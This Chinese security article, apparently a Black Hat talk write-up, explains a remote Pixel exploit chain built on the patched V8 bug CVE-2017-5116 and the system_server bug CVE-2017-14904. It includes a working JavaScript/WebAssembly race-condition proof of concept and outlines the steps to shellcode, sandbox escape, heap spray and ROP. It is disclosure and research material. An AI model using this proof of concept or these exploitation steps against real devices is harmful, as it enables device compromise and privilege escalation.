> 原文链接: https://www.anquanke.com//post/id/156405 


# Blackhat议题解读 | 赢得ASR奖励计划历史最高奖金的漏洞利用链


                                阅读量   
                                **167941**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t01a17c645f014acff0.jpg)](https://p5.ssl.qhimg.com/t01a17c645f014acff0.jpg)

近年来，Google在减少攻击面和漏洞利用缓解方面做出了很多努力，以加强Android系统的安全性。远程攻破Android手机，尤其是Google的Pixel手机变得越来越困难。

Pixel手机受到多个层次的安全保护，在2017年的Mobile Pwn2Own比赛中，Pixel 是唯一一个没有被攻破的设备，甚至没有选手报名挑战。但是我们的团队发现了一个远程攻击链 – 这是自Android安全奖励（ASR）计划开展以来的首个有效漏洞利用链，它可以远程攻破Pixel手机。我们将漏洞利用链直接报告给了Android安全团队。 由于漏洞的严重程度和我们的详细报告，我们获得了ASR奖励计划史上最高的奖励（112,500美元）。

这篇文章主要讲，我们是如何攻破pixel手机的。

攻破pixel的攻击链，主要有两个漏洞组成：
- V8引擎漏洞，实现浏览器渲染进程RCE
- System_server漏洞，实现沙箱逃逸和提权
文章大纲
- V8引擎漏洞利用
- System_server漏洞利用
- 总结


## V8引擎漏洞利用

这一章节，分为三个部分：
- 介绍SharedArrayBuffer 和 WebAssembly
- 分析利用链中第一个漏洞—CVE-2017-5116
- 利用CVE-2017-5116
首先介绍一些基础知识，SharedArrayBuffer 和 WebAssembly。

SharedArrayBuffer 对象用来表示一个通用的、固定长度的二进制缓冲区，和ArrayBuffer相似。V8 6.0版本开始引入SharedArrayBuffer，是一种使JavaScript workers之间能共享内存的底层的机制。SharedArrayBuffers还解锁了通过asm.js或WebAssembly将线程应用程序移植到Web的功能。

很遗憾，因为Spectre漏洞，从2018年1月开始，主要的浏览器默认都禁用SharedArrayBuffers。后续会不会默认被启用，值得关注。

WebAssembly 是一种新的代码类型，目前几种比较流行的浏览器都支持这种代码。它是一种底层语言，能提供像C/C++一样的性能，能被编译成二进制代码，与JavaScript并行运行。举一个WebAssembly代码的例子，如下：

```
var importObject = `{` imports: `{` imported_func: arg =&gt; console.log(arg) `}` `}`;

WebAssembly.instantiateStreaming(fetch('simple.wasm'), importObject)
.then(obj =&gt; obj.instance.exports.exported_func());
```

JavaScript代码能调用simple.wasm文件中导出的函数。

接下来，就开始介绍V8漏洞—CVE-2017-5116，该漏洞在chrome 61.0.3163.79版本被修复。

结合WebAssembly，SharedArrayBuffer 和Web worker 三个特点，通过条件竞争，可以触发一个越界访问bug，也就是该漏洞，触发流程如下：

[![](https://p4.ssl.qhimg.com/t013d6af89ebef82f97.png)](https://p4.ssl.qhimg.com/t013d6af89ebef82f97.png)

Worker线程将WebAssembly代码写入SharedArrayBuffer，然后传送给另一个web worker主线程，当主线程解析WebAssembly代码时，由于共享内存，worker线程此时可以修改此代码，从而造成越界访问问题。下面通过分析漏洞代码，来了解具体的细节。

```
i::wasm::ModuleWireBytes GetFirstArgumentAsBytes(
const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args, ErrorThrower* thrower) `{`
    ……
v8::Local&lt;v8::Value&gt; source = args[0];
if (source-&gt;IsArrayBuffer()) `{`
        ……
 `}` else if (source-&gt;IsTypedArray()) `{`//------&gt; source should be checked if it's backed by a SharedArrayBuffer
    // A TypedArray was passed.
    Local&lt;TypedArray&gt; array = Local&lt;TypedArray&gt;::Cast(source);
    Local&lt;ArrayBuffer&gt; buffer = array-&gt;Buffer();
    ArrayBuffer::Contents contents = buffer-&gt;GetContents();
    start =
    reinterpret_cast&lt;const byte*&gt;(contents.Data()) + array-&gt;ByteOffset();
    length = array-&gt;ByteLength();
 `}`
    ……
if (thrower-&gt;error()) return i::wasm::ModuleWireBytes(nullptr, nullptr);
return i::wasm::ModuleWireBytes(start, start + length);
`}`
```

漏洞发生在V8代码的wasm部分的GetFirstArgumentAsBytes函数，参数args可能是ArrayBuffer或者是TypedArray对象。当SharedArrayBuffer引入JavaScript之后，便可以被用来支撑TypedArray。代码中72行只是检查了souce是否是TypedArray，而没有检查是由SharedArrayBuffer作底层支持。这样一来，

TypedArray的内容随时可以被其他线程修改，而后续的解析操作，将会触发漏洞。

使用一个简单的PoC来说明如何触发漏洞。

```
&lt;html&gt;
&lt;h1&gt;poc&lt;/h1&gt;
&lt;script id="worker1"&gt;
worker:`{`
    if (typeof window 
=== 'object') break worker; // Bail if we're not a Worker
    self.onmessage = function(arg) `{`
      //%DebugPrint(arg.data);
      console.log("worker started");
      var ta = new Uint8Array(arg.data);
      //%DebugPrint(ta.buffer);
      var i =0;
      while(1)`{`
        if(i==0)`{`
          i=1;
          ta[51]=0; //------&gt;4)modify the webassembly code at the same time
        `}`else`{`
          i=0;
          ta[51]=128;
        `}`
      `}`
    `}`

```

```
&lt;script&gt;
function getSharedTypedArray()`{`
var wasmarr = [
0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03,
0x03, 0x02, 0x00, 0x00, 0x07, 0x12, 0x01, 0x0e,
0x67, 0x65, 0x74, 0x41, 0x6e, 0x73, 0x77, 0x65,
0x72, 0x50, 0x6c, 0x75, 0x73, 0x31, 0x00, 0x01,
0x0a, 0x0e, 0x02, 0x04, 0x00, 0x41, 0x2a, 0x0b,
0x07, 0x00, 0x10, 0x00, 0x41, 0x01, 0x6a, 0x0b];
var sb = new SharedArrayBuffer(wasmarr.length);
//---&gt; 1)put WebAssembly code in a SharedArrayBuffer
var sta = new Uint8Array(sb);
for(var i=0;i&lt;sta.length;i++)
sta[i]=wasmarr[i];
return sta;
`}`
var blob = new Blob([
document.querySelector('#worker1').textContent
], `{` type: "text/javascript" `}`)
var worker = new Worker(window.URL.createObjectURL(blob)); //---&gt; 2)create a web worker
var sta = getSharedTypedArray();
worker.postMessage(sta.buffer);
//---&gt;3)pass the WebAssembly code to the web worker
setTimeout(function()`{`
while(1)`{`
    try`{`
        sta[51]=0;
        var myModule = new WebAssembly.Module(sta); //---&gt;4)parse the WebAssembly code
        var myInstance = new WebAssembly.Instance(myModule);
        //myInstance.exports.getAnswerPlus1();
    `}`catch(e)`{`
`}`
`}`
`}`,1000);
//worker.terminate();
&lt;/script&gt;
&lt;/html&gt;
```

PoC中，worker1线程，修改WebAssembly代码，ta[51]改为128。

来看看另外一个线程，将WebAssembly写入SharedArrayBuffer，然后创建一个TypedArray数组sta，并且使用SharedArrayBuffer作为buffer。然后创建线程worker1，并且把SharedArrayBuffer传入worker1线程。当主线程在解析WebAssembly代码的时候，worker1线程修改了代码。worker1线程修改了什么代码？会造成什么影响呢？来看看PoC中WebAssembly code 的反汇编代码。

[![](https://p3.ssl.qhimg.com/t01d0f631aebc02b105.png)](https://p3.ssl.qhimg.com/t01d0f631aebc02b105.png)

worker1线程将”call 0” 指令改为”call 128”，与此同时主线程解析并编译此代码，从而引发OOB访问。

”call 0”指令可以被修改为调用任意wasm函数，如将”call 0”改为”call $leak”，如下：

[![](https://p3.ssl.qhimg.com/t013cb13db157fb96ac.png)](https://p3.ssl.qhimg.com/t013cb13db157fb96ac.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01c0d4ad4d66e46199.png)

通过$leak代码可以看出，寄存器和栈上的内容都会被dump到WebAssembly 内存中，由于指令”call 0”和”call $leak”所调用的函数参数不同，这将导致栈上很多有用的数据被泄露。

不仅仅”call 0”指令可有被修改，任何”call funcX”指令均可以被修改，如下：

```
/*Text format of funcX*/
(func $simple6 (param i32 i32 i32 i32 i32 i32 ) (result i32)
get_local 5
get_local 4
i32.add)
/*Disassembly code of funcX*/
--- Code ---
kind = WASM_FUNCTION
name = wasm#1
compiler = turbofan
Instructions (size = 20)
0x58f87600 0 8b442404 mov eax,[esp+0x4]
0x58f87604 4 03c6 add eax,esi
0x58f87606 6 c20400 ret 0x4
0x58f87609 9 0f1f00 nop
Safepoints (size = 8)
RelocInfo (size = 0)
--- End code ---
```

假设如上所示，funcX函数有6个参数，V8在ia32架构下编译此代码时，前5个参数是通过寄存器传递，第6个参数是通过栈传递。所有的参数都可以通过JavaScript设置为任意值。

```
/*Disassembly code of JS_TO_WASM function */
--- Code ---             
kind = JS_TO_WASM_FUNCTION
name = js-to-wasm#0
compiler = turbofan
Instructions (size = 170)
0x4be08f20 0 55 push ebp
0x4be08f21 1 89e5 mov ebp,esp
0x4be08f23 3 56 push esi              
0x4be08f24 4 57 push edi
0x4be08f25 5 83ec08 sub esp,0x8
0x4be08f28 8 8b4508 mov eax,[ebp+0x8]
0x4be08f2b b e8702e2bde call 0x2a0bbda0 (ToNumber) ;; code: BUILTIN
0x4be08f30 10 a801 test al,0x1
0x4be08f32 12 0f852a000000 jnz 0x4be08f62 &lt;+0x42&gt;
```

当JavaScript调用WebAssembly函数的时候，V8编译器在内部创建JS_TO_WASM函数，编译完成后，JavaScript会调用JS_TO_WASM，然后JS_TO_WASM会调用WebAssembly函数。然而JS_TO_WASM函数调用使用不同的约定，它的第一个函数通过栈传递。假如我们将”call funcX”改为 “call JS_TO_WASM”，将会发生什么呢？如下所示：

[![](https://p4.ssl.qhimg.com/t011e86e5150cbfcc75.png)](https://p4.ssl.qhimg.com/t011e86e5150cbfcc75.png)

JS_TO_WASM 函数将funcX函数的第6个参数作为第1个参数，并且将参数作为对象指针，因此当参数传入ToNumber函数时，将会导致类型混淆。由于参数值可以通过JS设置，所以可以将任何值作为对象指针传给ToNumber。

这样一来，我们可以在某些地址如double array中伪造一个ArrayBuffer，然后将此地址传入ToNumber，利用OOB 访问泄露ArrayBuffer对象。

V8中OOB Access的利用比较交单直接，一般采用以下几个步骤：
- 利用OOB泄露ArrayBuffer内容
- 使用泄露的数据在double array中伪造ArrayBuffer
- 将伪造的ArrayBuffer地址传入ToNumber
- 在回调函数中修改ArrayBuffer的BackingStore和ByteLength属性
- 实现任意地址读写
- 将JIT代码覆盖成shellcode，完成代码执行
具体的利用方法，很多优秀的浏览器安全研究员在各种安全会议上都曾讲过，也发表过不少文章，这里就不再详细阐述了。

漏洞补丁，对WebAssembly代码进行了拷贝，这样在解析的时候，避免使用共享内存。

[![](https://p3.ssl.qhimg.com/t01bf5c6b26094bff8e.png)](https://p3.ssl.qhimg.com/t01bf5c6b26094bff8e.png)



## system_server漏洞分析及利用

这一章节主要分为三个部分：
- 分析利用链中第二个漏洞，CVE-2017-14904
- 介绍一种沙箱逃逸方法，从而可以远程触发system_server漏洞
- 分析如何利用该漏洞
### 分析漏洞CVE-2017-14904

该沙箱逃逸漏洞，是由于map和unmap不匹配导致的Use-After-Unmap问题，相应的漏洞代码出现在libgralloc模块的gralloc_map和gralloc_unmap函数，下面对这两个函数进行详细分析。

[![](https://p5.ssl.qhimg.com/t01763380fa55485739.png)](https://p5.ssl.qhimg.com/t01763380fa55485739.png)

gralloc_map函数将graphic buffer映射到内存空间，graphic buffer 是由参数handle控制，而参数handle是由浏览器渲染进程控制。由于前面已经完成Chrome RCE，所以参数handle是可控的。

从上面代码可以看出，完成map操作之后，将映射地址mappedAddress加上hnd-&gt;offset 赋值给hnd-&gt;base，map出的内存空间将会在gralloc_map中被unmap。

[![](https://p0.ssl.qhimg.com/t012a0c1f32d19c6f09.png)](https://p0.ssl.qhimg.com/t012a0c1f32d19c6f09.png)

从代码中可以看出，hnd-&gt;base直接传入系统调用unmap，而没有减去hnd-&gt;offset，在该函数里，hnd-&gt;offset根本没有被使用，很显然，这将会导致map和unmap不匹配。

然而hnd-&gt;offset是可以被Chrome渲染进程操控的，结果导致存在这样的可能性：从Chrome沙箱进程中unmap system_server的任意内存页。

### 沙箱逃逸

前面已经完成了Chrome RCE，如果想从Chrome沙箱进程中触发system_server的漏洞，就需要完成沙箱逃逸。接下来就会介绍一种巧妙的沙箱逃逸方式。

[![](https://p0.ssl.qhimg.com/t0152a08a89978ffee6.png)](https://p0.ssl.qhimg.com/t0152a08a89978ffee6.png)

从上图可以看出Chrome是沙箱内进程，属于isolated_app 域。从下面isolated_app相应的sepolicy文件可以看出，从沙箱进程中，可以访问到一些服务，如activity_service。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e8e20f7336584040.png)

尽管可以从沙箱进程中获取到activity_service，但是当启动Activity的时候，enforceNotIsolatedCaller函数将会被调用，而这个函数会检查调用者是否在isolate_app域。

```
public final int startActivity(IApplicationThread caller, String callingPackage,
Intent intent, String resolvedType, IBinder resultTo, String resultWho, int requestCode,
int startFlags, ProfilerInfo profilerInfo, Bundle bOptions) `{`
    return startActivityAsUser(caller, callingPackage, intent, resolvedType, resultTo,
        resultWho, requestCode, startFlags, profilerInfo, bOptions,
        UserHandle.getCallingUserId());
`}`
 
public final int startActivityAsUser(IApplicationThread caller, String 
callingPackage, Intent intent, String resolvedType, IBinder resultTo, String resultWho, 
int requestCode, int startFlags, ProfilerInfo profilerInfo, Bundle bOptions, int userId)`{`
    enforceNotIsolatedCaller("startActivity");
    userId = mUserController.handleIncomingUser(Binder.getCallingPid(), 
Binder.getCallingUid(), userId, false, ALLOW_FULL_ONLY, "startActivity", null);
// TODO: Switch to user app stacks here.
return mActivityStarter.startActivityMayWait(caller, -1, callingPackage, intent,
    resolvedType, null, null, resultTo, resultWho, requestCode, startFlags,
     profilerInfo, null, null, bOptions, false, userId, null, null);
```

```
void enforceNotIsolatedCaller(String caller) `{`
   if (UserHandle.isIsolated(Binder.getCallingUid())) `{`
      throw new SecurityException("Isolated process not allowed to call " + caller);
   `}`
`}`
```

由于SeLinux的限制，大部分系统服务已经无法从沙箱进程中访问，攻击面变得越来越窄。

尽管有各种不同的限制，仍然能够找到一种方法，使用Parcelable对象，通过binder call方式，是沙箱进程能访问到system_server。

[![](https://p5.ssl.qhimg.com/t01ee49d8cf5d4c5fed.png)](https://p5.ssl.qhimg.com/t01ee49d8cf5d4c5fed.png)

Android中很多类实现了接口Parcelable，他们的成员函数createFromParcel是可以被沙箱进程使用binder call 方式调用的，GraphicBuffer类就是其中之一。

```
public class GraphicBuffer implements Parcelable `{`
…
public GraphicBuffer createFromParcel(Parcel in) `{`…`}`
`}`
```

后续分析的exploit，就是使用了GraphicBuffer。

```
case CONVERT_TO_TRANSLUCENT_TRANSACTION: `{`
data.enforceInterface(IActivityManager.descriptor);
IBinder token = data.readStrongBinder();
final Bundle bundle;
if (data.readInt() == 0) `{`
    bundle = null;
`}` else `{`
    bundle = data.readBundle();
`}`
final ActivityOptions options = ActivityOptions.fromBundle(bundle);
boolean converted = convertToTranslucent(token, options);
	……
`}`
```

上述代码，即是从沙箱进程访问system_server的方式，通过binder call，实现远程transact。从渲染进程中传入的bundle将会传入ActivityOptions对象的构造函数，如下代码所示：

```
public static ActivityOptions fromBundle(Bundle bOptions) `{`
        return bOptions != null ? new ActivityOptions(bOptions) : null;
`}`
public ActivityOptions(Bundle opts) `{`
opts.setDefusable(true);
mPackageName = opts.getString(KEY_PACKAGE_NAME);
try `{`
    mUsageTimeReport = opts.getParcelable(KEY_USAGE_TIME_REPORT);
`}` catch (RuntimeException e) `{`
    Slog.w(TAG, e);
`}`
```

从而，传入的bundle将会被system_server解析。

到此，也就找到了一条从Chrome沙箱进程中访问system_server的通道。调用createFromParcel创建bundle，将bundle封装到GraphicBuffer，通过binder call方式调用convertToTranslucent方法，从而将恶意的bundle传入system_server。

[![](https://p4.ssl.qhimg.com/t01398d18e900c5b7b3.png)](https://p4.ssl.qhimg.com/t01398d18e900c5b7b3.png)

### system_server漏洞利用

通过下面6个步骤，完成这个漏洞利用：
1. 地址空间塑形，创建一些连续的ashmem映射空间
1. 触发漏洞，unmap一部分堆和ashmem内存空间
1. 使用ashmem内存填充unmap掉的空间
1. 堆喷射，喷射的堆数据将会写入shamem空间
1. 泄露某些模块基地址，覆盖GraphicBuffer对象的虚函数指针
1. 触发GC，执行ROP
接下来逐一介绍每个步骤。

第一步，地址空间塑形，使一个堆块正好位于连续的ashmem映射空间之上，内存布局如下：

[![](https://p1.ssl.qhimg.com/t01f75090d6ae7f1af9.png)](https://p1.ssl.qhimg.com/t01f75090d6ae7f1af9.png)

第二步，触发漏洞，unmap掉部分堆和ashmem空间，如下图：

[![](https://p3.ssl.qhimg.com/t0164fa166a6bb0c51d.png)](https://p3.ssl.qhimg.com/t0164fa166a6bb0c51d.png)

Unmap 4KB堆内存空间，(2M-4KB)的ashmem空间，因此在堆块和ashmem29之间形成2M的间隙。

第三步，使用ashmem内存填充步骤2中unmap出的内存空间，如下：

[![](https://p1.ssl.qhimg.com/t013745c6cd87d6c093.png)](https://p1.ssl.qhimg.com/t013745c6cd87d6c093.png)

2M的间隙，被ashmem1001填充。

第四步，堆喷射，使喷射的堆数据写入ashmem内存，如下所示：

[![](https://p5.ssl.qhimg.com/t01ab3cf9c61405ea21.png)](https://p5.ssl.qhimg.com/t01ab3cf9c61405ea21.png)

堆喷时，堆管理程序认为内存空间0x7f547ff000 到 0x7f54800000仍然是可分配的，从而在这个区间分配内存，写入数据，导致将数据写入了ashmem空间。

第五步，在ashmem内存中创建GraphicBuffer对象，覆盖其虚拟函数指针，如下图：

[![](https://p0.ssl.qhimg.com/t01c8c448a9e8dfc22c.png)](https://p0.ssl.qhimg.com/t01c8c448a9e8dfc22c.png)

由于步骤三中填充的ashmem内存，同时被system_server和渲染进程map，因此system_server进程的部分堆空间可以被渲染进程读写，通过binder call，可以触发system_server在ashmem空间创建GraphicBuffer对象。

第六步，触发GC，执行ROP

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018b82f0d7d0ee5064.png)

GraphicBuffer继承RefBase类，从代码中可以看出，它有个虚函数成员

onLastStrongRef。完成了前面的步骤之后，可以从ashmem内存读取虚函数表地址，从而计算出onLastStrongRef地址。

从libui中可以找到了一些ROP，使用这些ROP覆盖函数地址，当GraphicBuffer对象被析构的时候，虚函数onLastStrongRef将会被调用，从而触发执行ROP。



## 总结

使用V8漏洞CVE-2017-5116攻破Chrome渲染进程

通过巧妙的方式，利用漏洞CVE-2017-14904，完成system_server远程提权

这两个漏洞均在2017年的12月安全更新中被修复
